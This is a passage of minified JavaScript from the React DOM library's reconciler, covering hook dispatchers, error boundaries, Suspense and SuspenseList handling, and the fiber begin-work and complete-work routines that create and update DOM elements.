    unstable_isNewReconciler: !1,
  },
  vy = {
    readContext: kn,
    useCallback: qm,
    useContext: kn,
    useEffect: Ed,
    useImperativeHandle: Km,
    useInsertionEffect: Xm,
    useLayoutEffect: Qm,
    useMemo: Zm,
    useReducer: Ka,
    useRef: Ym,
    useState: function () {
      return Ka(nl);
    },
    useDebugValue: Pd,
    useDeferredValue: function (t) {
      var e = Cn();
      return null === Be ? (e.memoizedState = t) : Jm(e, Be.memoizedState, t);
    },
    useTransition: function () {
      return [Ka(nl)[0], Cn().memoizedState];
    },
    useMutableSource: Um,
    useSyncExternalStore: Bm,
    useId: eg,
    unstable_isNewReconciler: !1,
  };
function Do(t, e) {
  try {
    var n = "",
      r = e;
    do {
      (n += Y_(r)), (r = r.return);
    } while (r);
    var i = n;
  } catch (o) {
    i = "\nError generating stack: " + o.message + "\n" + o.stack;
  }
  return { value: t, source: e, stack: i, digest: null };
}
function qa(t, e, n) {
  return { value: t, source: null, stack: n ?? null, digest: e ?? null };
}
function Zc(t, e) {
  try {
    console.error(e.value);
  } catch (n) {
    setTimeout(function () {
      throw n;
    });
  }
}
var yy = "function" == typeof WeakMap ? WeakMap : Map;
function ig(t, e, n) {
  ((n = pr(-1, n)).tag = 3), (n.payload = { element: null });
  var r = e.value;
  return (
    (n.callback = function () {
      Vu || ((Vu = !0), (af = r)), Zc(t, e);
    }),
    n
  );
}
function og(t, e, n) {
  (n = pr(-1, n)).tag = 3;
  var r = t.type.getDerivedStateFromError;
  if ("function" == typeof r) {
    var i = e.value;
    (n.payload = function () {
      return r(i);
    }),
      (n.callback = function () {
        Zc(t, e);
      });
  }
  var o = t.stateNode;
  return (
    null !== o &&
      "function" == typeof o.componentDidCatch &&
      (n.callback = function () {
        Zc(t, e),
          "function" != typeof r &&
            (null === Yr ? (Yr = new Set([this])) : Yr.add(this));
        var s = e.stack;
        this.componentDidCatch(e.value, {
          componentStack: null !== s ? s : "",
        });
      }),
    n
  );
}
function lh(t, e, n) {
  var r = t.pingCache;
  if (null === r) {
    r = t.pingCache = new yy();
    var i = new Set();
    r.set(e, i);
  } else void 0 === (i = r.get(e)) && ((i = new Set()), r.set(e, i));
  i.has(n) || (i.add(n), (t = Ly.bind(null, t, e, n)), e.then(t, t));
}
function uh(t) {
  do {
    var e;
    if (
      ((e = 13 === t.tag) &&
        (e = null === (e = t.memoizedState) || null !== e.dehydrated),
      e)
    )
      return t;
    t = t.return;
  } while (null !== t);
  return null;
}
function ah(t, e, n, r, i) {
  return 1 & t.mode
    ? ((t.flags |= 65536), (t.lanes = i), t)
    : (t === e
        ? (t.flags |= 65536)
        : ((t.flags |= 128),
          (n.flags |= 131072),
          (n.flags &= -52805),
          1 === n.tag &&
            (null === n.alternate
              ? (n.tag = 17)
              : (((e = pr(-1, 1)).tag = 2), Wr(n, e, 1))),
          (n.lanes |= 1)),
      t);
}
var xy = Sr.ReactCurrentOwner,
  It = !1;
function Ct(t, e, n, r) {
  e.child = null === t ? Am(e, null, n, r) : Oo(e, t.child, n, r);
}
function ch(t, e, n, r, i) {
  n = n.render;
  var o = e.ref;
  return (
    xo(e, i),
    (r = Cd(t, e, n, r, o, i)),
    (n = Td()),
    null === t || It
      ? (_e && n && dd(e), (e.flags |= 1), Ct(t, e, r, i), e.child)
      : ((e.updateQueue = t.updateQueue),
        (e.flags &= -2053),
        (t.lanes &= ~i),
        yr(t, e, i))
  );
}
function fh(t, e, n, r, i) {
  if (null === t) {
    var o = n.type;
    return "function" != typeof o ||
      jd(o) ||
      void 0 !== o.defaultProps ||
      null !== n.compare ||
      void 0 !== n.defaultProps
      ? (((t = uu(n.type, null, r, e, e.mode, i)).ref = e.ref),
        (t.return = e),
        (e.child = t))
      : ((e.tag = 15), (e.type = o), sg(t, e, o, r, i));
  }
  if (((o = t.child), !(t.lanes & i))) {
    var s = o.memoizedProps;
    if ((n = null !== (n = n.compare) ? n : Gs)(s, r) && t.ref === e.ref)
      return yr(t, e, i);
  }
  return (
    (e.flags |= 1), ((t = Qr(o, r)).ref = e.ref), (t.return = e), (e.child = t)
  );
}
function sg(t, e, n, r, i) {
  if (null !== t) {
    var o = t.memoizedProps;
    if (Gs(o, r) && t.ref === e.ref) {
      if (((It = !1), (e.pendingProps = r = o), 0 == (t.lanes & i)))
        return (e.lanes = t.lanes), yr(t, e, i);
      131072 & t.flags && (It = !0);
    }
  }
  return Jc(t, e, n, r, i);
}
function lg(t, e, n) {
  var r = e.pendingProps,
    i = r.children,
    o = null !== t ? t.memoizedState : null;
  if ("hidden" === r.mode)
    if (1 & e.mode) {
      if (!(1073741824 & n))
        return (
          (t = null !== o ? o.baseLanes | n : n),
          (e.lanes = e.childLanes = 1073741824),
          (e.memoizedState = {
            baseLanes: t,
            cachePool: null,
            transitions: null,
          }),
          (e.updateQueue = null),
          de(co, qt),
          (qt |= t),
          null
        );
      (e.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        (r = null !== o ? o.baseLanes : n),
        de(co, qt),
        (qt |= r);
    } else
      (e.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        de(co, qt),
        (qt |= n);
  else
    null !== o ? ((r = o.baseLanes | n), (e.memoizedState = null)) : (r = n),
      de(co, qt),
      (qt |= r);
  return Ct(t, e, i, n), e.child;
}
function ug(t, e) {
  var n = e.ref;
  ((null === t && null !== n) || (null !== t && t.ref !== n)) &&
    ((e.flags |= 512), (e.flags |= 2097152));
}
function Jc(t, e, n, r, i) {
  var o = Ft(n) ? Oi : gt.current;
  return (
    (o = No(e, o)),
    xo(e, i),
    (n = Cd(t, e, n, r, o, i)),
    (r = Td()),
    null === t || It
      ? (_e && r && dd(e), (e.flags |= 1), Ct(t, e, n, i), e.child)
      : ((e.updateQueue = t.updateQueue),
        (e.flags &= -2053),
        (t.lanes &= ~i),
        yr(t, e, i))
  );
}
function dh(t, e, n, r, i) {
  if (Ft(n)) {
    var o = !0;
    Ru(e);
  } else o = !1;
  if ((xo(e, i), null === e.stateNode))
    ou(t, e), jm(e, n, r), qc(e, n, r, i), (r = !0);
  else if (null === t) {
    var s = e.stateNode,
      l = e.memoizedProps;
    s.props = l;
    var u = s.context,
      a = n.contextType;
    "object" == typeof a && null !== a
      ? (a = kn(a))
      : (a = No(e, (a = Ft(n) ? Oi : gt.current)));
    var c = n.getDerivedStateFromProps,
      p =
        "function" == typeof c ||
        "function" == typeof s.getSnapshotBeforeUpdate;
    p ||
      ("function" != typeof s.UNSAFE_componentWillReceiveProps &&
        "function" != typeof s.componentWillReceiveProps) ||
      ((l !== r || u !== a) && rh(e, s, r, a)),
      (Or = !1);
    var f = e.memoizedState;
    (s.state = f),
      Iu(e, r, s, i),
      (u = e.memoizedState),
      l !== r || f !== u || At.current || Or
        ? ("function" == typeof c && (Kc(e, n, c, r), (u = e.memoizedState)),
          (l = Or || nh(e, n, l, r, f, u, a))
            ? (p ||
                ("function" != typeof s.UNSAFE_componentWillMount &&
                  "function" != typeof s.componentWillMount) ||
                ("function" == typeof s.componentWillMount &&
                  s.componentWillMount(),
                "function" == typeof s.UNSAFE_componentWillMount &&
                  s.UNSAFE_componentWillMount()),
              "function" == typeof s.componentDidMount && (e.flags |= 4194308))
            : ("function" == typeof s.componentDidMount && (e.flags |= 4194308),
              (e.memoizedProps = r),
              (e.memoizedState = u)),
          (s.props = r),
          (s.state = u),
          (s.context = a),
          (r = l))
        : ("function" == typeof s.componentDidMount && (e.flags |= 4194308),
          (r = !1));
  } else {
    (s = e.stateNode),
      Lm(t, e),
      (l = e.memoizedProps),
      (a = e.type === e.elementType ? l : Rn(e.type, l)),
      (s.props = a),
      (p = e.pendingProps),
      (f = s.context),
      "object" == typeof (u = n.contextType) && null !== u
        ? (u = kn(u))
        : (u = No(e, (u = Ft(n) ? Oi : gt.current)));
    var d = n.getDerivedStateFromProps;
    (c =
      "function" == typeof d ||
      "function" == typeof s.getSnapshotBeforeUpdate) ||
      ("function" != typeof s.UNSAFE_componentWillReceiveProps &&
        "function" != typeof s.componentWillReceiveProps) ||
      ((l !== p || f !== u) && rh(e, s, r, u)),
      (Or = !1),
      (f = e.memoizedState),
      (s.state = f),
      Iu(e, r, s, i);
    var v = e.memoizedState;
    l !== p || f !== v || At.current || Or
      ? ("function" == typeof d && (Kc(e, n, d, r), (v = e.memoizedState)),
        (a = Or || nh(e, n, a, r, f, v, u) || !1)
          ? (c ||
              ("function" != typeof s.UNSAFE_componentWillUpdate &&
                "function" != typeof s.componentWillUpdate) ||
              ("function" == typeof s.componentWillUpdate &&
                s.componentWillUpdate(r, v, u),
              "function" == typeof s.UNSAFE_componentWillUpdate &&
                s.UNSAFE_componentWillUpdate(r, v, u)),
            "function" == typeof s.componentDidUpdate && (e.flags |= 4),
            "function" == typeof s.getSnapshotBeforeUpdate && (e.flags |= 1024))
          : ("function" != typeof s.componentDidUpdate ||
              (l === t.memoizedProps && f === t.memoizedState) ||
              (e.flags |= 4),
            "function" != typeof s.getSnapshotBeforeUpdate ||
              (l === t.memoizedProps && f === t.memoizedState) ||
              (e.flags |= 1024),
            (e.memoizedProps = r),
            (e.memoizedState = v)),
        (s.props = r),
        (s.state = v),
        (s.context = u),
        (r = a))
      : ("function" != typeof s.componentDidUpdate ||
          (l === t.memoizedProps && f === t.memoizedState) ||
          (e.flags |= 4),
        "function" != typeof s.getSnapshotBeforeUpdate ||
          (l === t.memoizedProps && f === t.memoizedState) ||
          (e.flags |= 1024),
        (r = !1));
  }
  return ef(t, e, n, r, o, i);
}
function ef(t, e, n, r, i, o) {
  ug(t, e);
  var s = 0 != (128 & e.flags);
  if (!r && !s) return i && qp(e, n, !1), yr(t, e, o);
  (r = e.stateNode), (xy.current = e);
  var l =
    s && "function" != typeof n.getDerivedStateFromError ? null : r.render();
  return (
    (e.flags |= 1),
    null !== t && s
      ? ((e.child = Oo(e, t.child, null, o)), (e.child = Oo(e, null, l, o)))
      : Ct(t, e, l, o),
    (e.memoizedState = r.state),
    i && qp(e, n, !0),
    e.child
  );
}
function ag(t) {
  var e = t.stateNode;
  e.pendingContext
    ? Kp(t, e.pendingContext, e.pendingContext !== e.context)
    : e.context && Kp(t, e.context, !1),
    xd(t, e.containerInfo);
}
function ph(t, e, n, r, i) {
  return Mo(), hd(i), (e.flags |= 256), Ct(t, e, n, r), e.child;
}
var dg,
  rf,
  pg,
  hg,
  tf = { dehydrated: null, treeContext: null, retryLane: 0 };
function nf(t) {
  return { baseLanes: t, cachePool: null, transitions: null };
}
function cg(t, e, n) {
  var l,
    r = e.pendingProps,
    i = xe.current,
    o = !1,
    s = 0 != (128 & e.flags);
  if (
    ((l = s) || (l = (null === t || null !== t.memoizedState) && 0 != (2 & i)),
    l
      ? ((o = !0), (e.flags &= -129))
      : (null === t || null !== t.memoizedState) && (i |= 1),
    de(xe, 1 & i),
    null === t)
  )
    return (
      Qc(e),
      null !== (t = e.memoizedState) && null !== (t = t.dehydrated)
        ? (1 & e.mode
            ? "$!" === t.data
              ? (e.lanes = 8)
              : (e.lanes = 1073741824)
            : (e.lanes = 1),
          null)
        : ((s = r.children),
          (t = r.fallback),
          o
            ? ((r = e.mode),
              (o = e.child),
              (s = { mode: "hidden", children: s }),
              1 & r || null === o
                ? (o = ga(s, r, 0, null))
                : ((o.childLanes = 0), (o.pendingProps = s)),
              (t = ki(t, r, n, null)),
              (o.return = e),
              (t.return = e),
              (o.sibling = t),
              (e.child = o),
              (e.child.memoizedState = nf(n)),
              (e.memoizedState = tf),
              t)
            : Nd(e, s))
    );
  if (null !== (i = t.memoizedState) && null !== (l = i.dehydrated))
    return wy(t, e, s, r, l, i, n);
  if (o) {
    (o = r.fallback), (s = e.mode), (l = (i = t.child).sibling);
    var u = { mode: "hidden", children: r.children };
    return (
      1 & s || e.child === i
        ? ((r = Qr(i, u)).subtreeFlags = 14680064 & i.subtreeFlags)
        : (((r = e.child).childLanes = 0),
          (r.pendingProps = u),
          (e.deletions = null)),
      null !== l ? (o = Qr(l, o)) : ((o = ki(o, s, n, null)).flags |= 2),
      (o.return = e),
      (r.return = e),
      (r.sibling = o),
      (e.child = r),
      (r = o),
      (o = e.child),
      (s =
        null === (s = t.child.memoizedState)
          ? nf(n)
          : {
              baseLanes: s.baseLanes | n,
              cachePool: null,
              transitions: s.transitions,
            }),
      (o.memoizedState = s),
      (o.childLanes = t.childLanes & ~n),
      (e.memoizedState = tf),
      r
    );
  }
  return (
    (t = (o = t.child).sibling),
    (r = Qr(o, { mode: "visible", children: r.children })),
    !(1 & e.mode) && (r.lanes = n),
    (r.return = e),
    (r.sibling = null),
    null !== t &&
      (null === (n = e.deletions)
        ? ((e.deletions = [t]), (e.flags |= 16))
        : n.push(t)),
    (e.child = r),
    (e.memoizedState = null),
    r
  );
}
function Nd(t, e) {
  return (
    ((e = ga({ mode: "visible", children: e }, t.mode, 0, null)).return = t),
    (t.child = e)
  );
}
function Ll(t, e, n, r) {
  return (
    null !== r && hd(r),
    Oo(e, t.child, null, n),
    ((t = Nd(e, e.pendingProps.children)).flags |= 2),
    (e.memoizedState = null),
    t
  );
}
function wy(t, e, n, r, i, o, s) {
  if (n)
    return 256 & e.flags
      ? ((e.flags &= -257), Ll(t, e, s, (r = qa(Error(R(422))))))
      : null !== e.memoizedState
      ? ((e.child = t.child), (e.flags |= 128), null)
      : ((o = r.fallback),
        (i = e.mode),
        (r = ga({ mode: "visible", children: r.children }, i, 0, null)),
        ((o = ki(o, i, s, null)).flags |= 2),
        (r.return = e),
        (o.return = e),
        (r.sibling = o),
        (e.child = r),
        1 & e.mode && Oo(e, t.child, null, s),
        (e.child.memoizedState = nf(s)),
        (e.memoizedState = tf),
        o);
  if (!(1 & e.mode)) return Ll(t, e, s, null);
  if ("$!" === i.data) {
    if ((r = i.nextSibling && i.nextSibling.dataset)) var l = r.dgst;
    return (r = l), Ll(t, e, s, (r = qa((o = Error(R(419))), r, void 0)));
  }
  if (((l = 0 != (s & t.childLanes)), It || l)) {
    if (null !== (r = Ze)) {
      switch (s & -s) {
        case 4:
          i = 2;
          break;
        case 16:
          i = 8;
          break;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
          i = 32;
          break;
        case 536870912:
          i = 268435456;
          break;
        default:
          i = 0;
      }
      0 !== (i = i & (r.suspendedLanes | s) ? 0 : i) &&
        i !== o.retryLane &&
        ((o.retryLane = i), vr(t, i), Fn(r, t, i, -1));
    }
    return zd(), Ll(t, e, s, (r = qa(Error(R(421)))));
  }
  return "$?" === i.data
    ? ((e.flags |= 128),
      (e.child = t.child),
      (e = zy.bind(null, t)),
      (i._reactRetry = e),
      null)
    : ((t = o.treeContext),
      (nn = $r(i.nextSibling)),
      (rn = e),
      (_e = !0),
      (zn = null),
      null !== t &&
        ((hn[mn++] = cr),
        (hn[mn++] = fr),
        (hn[mn++] = Ri),
        (cr = t.id),
        (fr = t.overflow),
        (Ri = e)),
      ((e = Nd(e, r.children)).flags |= 4096),
      e);
}
function hh(t, e, n) {
  t.lanes |= e;
  var r = t.alternate;
  null !== r && (r.lanes |= e), Gc(t.return, e, n);
}
function Za(t, e, n, r, i) {
  var o = t.memoizedState;
  null === o
    ? (t.memoizedState = {
        isBackwards: e,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: i,
      })
    : ((o.isBackwards = e),
      (o.rendering = null),
      (o.renderingStartTime = 0),
      (o.last = r),
      (o.tail = n),
      (o.tailMode = i));
}
function fg(t, e, n) {
  var r = e.pendingProps,
    i = r.revealOrder,
    o = r.tail;
  if ((Ct(t, e, r.children, n), 2 & (r = xe.current)))
    (r = (1 & r) | 2), (e.flags |= 128);
  else {
    if (null !== t && 128 & t.flags)
      e: for (t = e.child; null !== t; ) {
        if (13 === t.tag) null !== t.memoizedState && hh(t, n, e);
        else if (19 === t.tag) hh(t, n, e);
        else if (null !== t.child) {
          (t.child.return = t), (t = t.child);
          continue;
        }
        if (t === e) break e;
        for (; null === t.sibling; ) {
          if (null === t.return || t.return === e) break e;
          t = t.return;
        }
        (t.sibling.return = t.return), (t = t.sibling);
      }
    r &= 1;
  }
  if ((de(xe, r), 1 & e.mode))
    switch (i) {
      case "forwards":
        for (n = e.child, i = null; null !== n; )
          null !== (t = n.alternate) && null === Au(t) && (i = n),
            (n = n.sibling);
        null === (n = i)
          ? ((i = e.child), (e.child = null))
          : ((i = n.sibling), (n.sibling = null)),
          Za(e, !1, i, n, o);
        break;
      case "backwards":
        for (n = null, i = e.child, e.child = null; null !== i; ) {
          if (null !== (t = i.alternate) && null === Au(t)) {
            e.child = i;
            break;
          }
          (t = i.sibling), (i.sibling = n), (n = i), (i = t);
        }
        Za(e, !0, n, null, o);
        break;
      case "together":
        Za(e, !1, null, null, void 0);
        break;
      default:
        e.memoizedState = null;
    }
  else e.memoizedState = null;
  return e.child;
}
function ou(t, e) {
  !(1 & e.mode) &&
    null !== t &&
    ((t.alternate = null), (e.alternate = null), (e.flags |= 2));
}
function yr(t, e, n) {
  if (
    (null !== t && (e.dependencies = t.dependencies),
    (Li |= e.lanes),
    !(n & e.childLanes))
  )
    return null;
  if (null !== t && e.child !== t.child) throw Error(R(153));
  if (null !== e.child) {
    for (
      n = Qr((t = e.child), t.pendingProps), e.child = n, n.return = e;
      null !== t.sibling;

    )
      (t = t.sibling), ((n = n.sibling = Qr(t, t.pendingProps)).return = e);
    n.sibling = null;
  }
  return e.child;
}
function Sy(t, e, n) {
  switch (e.tag) {
    case 3:
      ag(e), Mo();
      break;
    case 5:
      Fm(e);
      break;
    case 1:
      Ft(e.type) && Ru(e);
      break;
    case 4:
      xd(e, e.stateNode.containerInfo);
      break;
    case 10:
      var r = e.type._context,
        i = e.memoizedProps.value;
      de(zu, r._currentValue), (r._currentValue = i);
      break;
    case 13:
      if (null !== (r = e.memoizedState))
        return null !== r.dehydrated
          ? (de(xe, 1 & xe.current), (e.flags |= 128), null)
          : n & e.child.childLanes
          ? cg(t, e, n)
          : (de(xe, 1 & xe.current),
            null !== (t = yr(t, e, n)) ? t.sibling : null);
      de(xe, 1 & xe.current);
      break;
    case 19:
      if (((r = 0 != (n & e.childLanes)), 128 & t.flags)) {
        if (r) return fg(t, e, n);
        e.flags |= 128;
      }
      if (
        (null !== (i = e.memoizedState) &&
          ((i.rendering = null), (i.tail = null), (i.lastEffect = null)),
        de(xe, xe.current),
        r)
      )
        break;
      return null;
    case 22:
    case 23:
      return (e.lanes = 0), lg(t, e, n);
  }
  return yr(t, e, n);
}
function is(t, e) {
  if (!_e)
    switch (t.tailMode) {
      case "hidden":
        e = t.tail;
        for (var n = null; null !== e; )
          null !== e.alternate && (n = e), (e = e.sibling);
        null === n ? (t.tail = null) : (n.sibling = null);
        break;
      case "collapsed":
        n = t.tail;
        for (var r = null; null !== n; )
          null !== n.alternate && (r = n), (n = n.sibling);
        null === r
          ? e || null === t.tail
            ? (t.tail = null)
            : (t.tail.sibling = null)
          : (r.sibling = null);
    }
}
function ct(t) {
  var e = null !== t.alternate && t.alternate.child === t.child,
    n = 0,
    r = 0;
  if (e)
    for (var i = t.child; null !== i; )
      (n |= i.lanes | i.childLanes),
        (r |= 14680064 & i.subtreeFlags),
        (r |= 14680064 & i.flags),
        (i.return = t),
        (i = i.sibling);
  else
    for (i = t.child; null !== i; )
      (n |= i.lanes | i.childLanes),
        (r |= i.subtreeFlags),
        (r |= i.flags),
        (i.return = t),
        (i = i.sibling);
  return (t.subtreeFlags |= r), (t.childLanes = n), e;
}
function ky(t, e, n) {
  var r = e.pendingProps;
  switch ((pd(e), e.tag)) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
      return ct(e), null;
    case 1:
    case 17:
      return Ft(e.type) && Ou(), ct(e), null;
    case 3:
      return (
        (r = e.stateNode),
        Ro(),
        he(At),
        he(gt),
        Sd(),
        r.pendingContext &&
          ((r.context = r.pendingContext), (r.pendingContext = null)),
        (null === t || null === t.child) &&
          (Rl(e)
            ? (e.flags |= 4)
            : null === t ||
              (t.memoizedState.isDehydrated && !(256 & e.flags)) ||
              ((e.flags |= 1024), null !== zn && (df(zn), (zn = null)))),
        rf(t, e),
        ct(e),
        null
      );
    case 5:
      wd(e);
      var i = yi(el.current);
      if (((n = e.type), null !== t && null != e.stateNode))
        pg(t, e, n, r, i),
          t.ref !== e.ref && ((e.flags |= 512), (e.flags |= 2097152));
      else {
        if (!r) {
          if (null === e.stateNode) throw Error(R(166));
          return ct(e), null;
        }
        if (((t = yi(Zn.current)), Rl(e))) {
          (r = e.stateNode), (n = e.type);
          var o = e.memoizedProps;
          switch (((r[Qn] = e), (r[Zs] = o), (t = 0 != (1 & e.mode)), n)) {
            case "dialog":
              pe("cancel", r), pe("close", r);
              break;
            case "iframe":
            case "object":
            case "embed":
              pe("load", r);
              break;
            case "video":
            case "audio":
              for (i = 0; i < hs.length; i++) pe(hs[i], r);
              break;
            case "source":
              pe("error", r);
              break;
            case "img":
            case "image":
            case "link":
              pe("error", r), pe("load", r);
              break;
            case "details":
              pe("toggle", r);
              break;
            case "input":
              kp(r, o), pe("invalid", r);
              break;
            case "select":
              (r._wrapperState = { wasMultiple: !!o.multiple }),
                pe("invalid", r);
              break;
            case "textarea":
              Tp(r, o), pe("invalid", r);
          }
          for (var s in (Oc(n, o), (i = null), o))
            if (o.hasOwnProperty(s)) {
              var l = o[s];
              "children" === s
                ? "string" == typeof l
                  ? r.textContent !== l &&
                    (!0 !== o.suppressHydrationWarning &&
                      Ol(r.textContent, l, t),
                    (i = ["children", l]))
                  : "number" == typeof l &&
                    r.textContent !== "" + l &&
                    (!0 !== o.suppressHydrationWarning &&
                      Ol(r.textContent, l, t),
                    (i = ["children", "" + l]))
                : Hs.hasOwnProperty(s) &&
                  null != l &&
                  "onScroll" === s &&
                  pe("scroll", r);
            }
          switch (n) {
            case "input":
              Sl(r), Cp(r, o, !0);
              break;
            case "textarea":
              Sl(r), Ep(r);
              break;
            case "select":
            case "option":
              break;
            default:
              "function" == typeof o.onClick && (r.onclick = Mu);
          }
          (r = i), (e.updateQueue = r), null !== r && (e.flags |= 4);
        } else {
          (s = 9 === i.nodeType ? i : i.ownerDocument),
            "http://www.w3.org/1999/xhtml" === t && (t = V0(n)),
            "http://www.w3.org/1999/xhtml" === t
              ? "script" === n
                ? (((t = s.createElement("div")).innerHTML =
                    "<script></script>"),
                  (t = t.removeChild(t.firstChild)))
                : "string" == typeof r.is
                ? (t = s.createElement(n, { is: r.is }))
                : ((t = s.createElement(n)),
                  "select" === n &&
                    ((s = t),
                    r.multiple
                      ? (s.multiple = !0)
                      : r.size && (s.size = r.size)))
              : (t = s.createElementNS(t, n)),
            (t[Qn] = e),
            (t[Zs] = r),
            dg(t, e, !1, !1),
            (e.stateNode = t);
          e: {
            switch (((s = Rc(n, r)), n)) {
              case "dialog":
                pe("cancel", t), pe("close", t), (i = r);
                break;
              case "iframe":
              case "object":
              case "embed":
                pe("load", t), (i = r);
                break;
              case "video":
              case "audio":
                for (i = 0; i < hs.length; i++) pe(hs[i], t);
                i = r;
                break;
              case "source":
                pe("error", t), (i = r);
                break;
              case "img":
              case "image":
              case "link":
                pe("error", t), pe("load", t), (i = r);
                break;
              case "details":
                pe("toggle", t), (i = r);
                break;
              case "input":
                kp(t, r), (i = Tc(t, r)), pe("invalid", t);
                break;
              case "option":
              default:
                i = r;
                break;
              case "select":
                (t._wrapperState = { wasMultiple: !!r.multiple }),
                  (i = Ce({}, r, { value: void 0 })),
                  pe("invalid", t);
                break;
              case "textarea":
                Tp(t, r), (i = Nc(t, r)), pe("invalid", t);
            }
            for (o in (Oc(n, i), (l = i)))
              if (l.hasOwnProperty(o)) {
                var u = l[o];
                "style" === o
                  ? $0(t, u)
                  : "dangerouslySetInnerHTML" === o
                  ? null != (u = u ? u.__html : void 0) && H0(t, u)
                  : "children" === o
                  ? "string" == typeof u
                    ? ("textarea" !== n || "" !== u) && bs(t, u)
                    : "number" == typeof u && bs(t, "" + u)
                  : "suppressContentEditableWarning" !== o &&
                    "suppressHydrationWarning" !== o &&
                    "autoFocus" !== o &&
                    (Hs.hasOwnProperty(o)
                      ? null != u && "onScroll" === o && pe("scroll", t)
                      : null != u && Zf(t, o, u, s));
              }
            switch (n) {
              case "input":
                Sl(t), Cp(t, r, !1);
                break;
              case "textarea":
                Sl(t), Ep(t);
                break;
              case "option":
                null != r.value && t.setAttribute("value", "" + Zr(r.value));
                break;
              case "select":
                (t.multiple = !!r.multiple),
                  null != (o = r.value)
                    ? go(t, !!r.multiple, o, !1)
                    : null != r.defaultValue &&
                      go(t, !!r.multiple, r.defaultValue, !0);
                break;
              default:
                "function" == typeof i.onClick && (t.onclick = Mu);
            }
            switch (n) {
              case "button":
              case "input":
              case "select":
              case "textarea":
                r = !!r.autoFocus;
                break e;
              case "img":
                r = !0;
                break e;
              default:
                r = !1;
            }
          }
          r && (e.flags |= 4);
        }
        null !== e.ref && ((e.flags |= 512), (e.flags |= 2097152));
      }
      return ct(e), null;
    case 6:
      if (t && null != e.stateNode) hg(t, e, t.memoizedProps, r);
      else {
        if ("string" != typeof r && null === e.stateNode) throw Error(R(166));
        if (((n = yi(el.current)), yi(Zn.current), Rl(e))) {
          if (
            ((r = e.stateNode),
            (n = e.memoizedProps),
            (r[Qn] = e),
            (o = r.nodeValue !== n) && null !== (t = rn))
          )
            switch (t.tag) {
              case 3:
                Ol(r.nodeValue, n, 0 != (1 & t.mode));
                break;
              case 5:
                !0 !== t.memoizedProps.suppressHydrationWarning &&
                  Ol(r.nodeValue, n, 0 != (1 & t.mode));
            }
          o && (e.flags |= 4);
        } else
          ((r = (9 === n.nodeType ? n : n.ownerDocument).createTextNode(r))[
            Qn
          ] = e),
            (e.stateNode = r);
      }
      return ct(e), null;
    case 13:
      if (
        (he(xe),
        (r = e.memoizedState),
        null === t ||
          (null !== t.memoizedState && null !== t.memoizedState.dehydrated))
      ) {
        if (_e && null !== nn && 1 & e.mode && !(128 & e.flags))
          Rm(), Mo(), (e.flags |= 98560), (o = !1);
        else if (((o = Rl(e)), null !== r && null !== r.dehydrated)) {
          if (null === t) {
            if (!o) throw Error(R(318));
            if (!(o = null !== (o = e.memoizedState) ? o.dehydrated : null))
              throw Error(R(317));
            o[Qn] = e;
          } else
            Mo(), !(128 & e.flags) && (e.memoizedState = null), (e.flags |= 4);
          ct(e), (o = !1);
        } else null !== zn && (df(zn), (zn = null)), (o = !0);
        if (!o) return 65536 & e.flags ? e : null;
      }
      return 128 & e.flags
        ? ((e.lanes = n), e)
        : ((r = null !== r) !== (null !== t && null !== t.memoizedState) &&
            r &&
            ((e.child.flags |= 8192),
            1 & e.mode &&
              (null === t || 1 & xe.current ? 0 === be && (be = 3) : zd())),
          null !== e.updateQueue && (e.flags |= 4),
          ct(e),
          null);
    case 4:
      return (
        Ro(), rf(t, e), null === t && Ks(e.stateNode.containerInfo), ct(e), null
      );
    case 10:
      return _d(e.type._context), ct(e), null;
    case 19:
      if ((he(xe), null === (o = e.memoizedState))) return ct(e), null;
      if (((r = 0 != (128 & e.flags)), null === (s = o.rendering)))
        if (r) is(o, !1);
        else {
          if (0 !== be || (null !== t && 128 & t.flags))
            for (t = e.child; null !== t; ) {
              if (null !== (s = Au(t))) {
                for (
                  e.flags |= 128,
                    is(o, !1),
                    null !== (r = s.updateQueue) &&
                      ((e.updateQueue = r), (e.flags |= 4)),
                    e.subtreeFlags = 0,
                    r = n,
                    n = e.child;
                  null !== n;

                )
                  (t = r),
                    ((o = n).flags &= 14680066),
                    null === (s = o.alternate)
                      ? ((o.childLanes = 0),
                        (o.lanes = t),
                        (o.child = null),
                        (o.subtreeFlags = 0),
                        (o.memoizedProps = null),
                        (o.memoizedState = null),
                        (o.updateQueue = null),
                        (o.dependencies = null),
                        (o.stateNode = null))
                      : ((o.childLanes = s.childLanes),
                        (o.lanes = s.lanes),
                        (o.child = s.child),
                        (o.subtreeFlags = 0),
                        (o.deletions = null),
                        (o.memoizedProps = s.memoizedProps),
                        (o.memoizedState = s.memoizedState),
                        (o.updateQueue = s.updateQueue),
                        (o.type = s.type),
                        (t = s.dependencies),
                        (o.dependencies =
                          null === t
                            ? null
                            : {
                                lanes: t.lanes,
                                firstContext: t.firstContext,
                              })),
                    (n = n.sibling);
                return de(xe, (1 & xe.current) | 2), e.child;
              }
              t = t.sibling;
            }
          null !== o.tail &&
            Le() > Lo &&
            ((e.flags |= 128), (r = !0), is(o, !1), (e.lanes = 4194304));
        }
      else {
        if (!r)
          if (null !== (t = Au(s))) {
            if (
              ((e.flags |= 128),
              (r = !0),
              null !== (n = t.updateQueue) &&
                ((e.updateQueue = n), (e.flags |= 4)),
              is(o, !0),
              null === o.tail && "hidden" === o.tailMode && !s.alternate && !_e)
            )
              return ct(e), null;
          } else
            2 * Le() - o.renderingStartTime > Lo &&
              1073741824 !== n &&
              ((e.flags |= 128), (r = !0), is(o, !1), (e.lanes = 4194304));
        o.isBackwards
          ? ((s.sibling = e.child), (e.child = s))
          : (null !== (n = o.last) ? (n.sibling = s) : (e.child = s),
            (o.last = s));
      }
      return null !== o.tail
        ? ((e = o.tail),
          (o.rendering = e),
          (o.tail = e.sibling),
          (o.renderingStartTime = Le()),
          (e.sibling = null),
          (n = xe.current),
          de(xe, r ? (1 & n) | 2 : 1 & n),
          e)
        : (ct(e), null);
    case 22:
    case 23:
      return (
        Ld(),
        (r = null !== e.memoizedState),
        null !== t && (null !== t.memoizedState) !== r && (e.flags |= 8192),
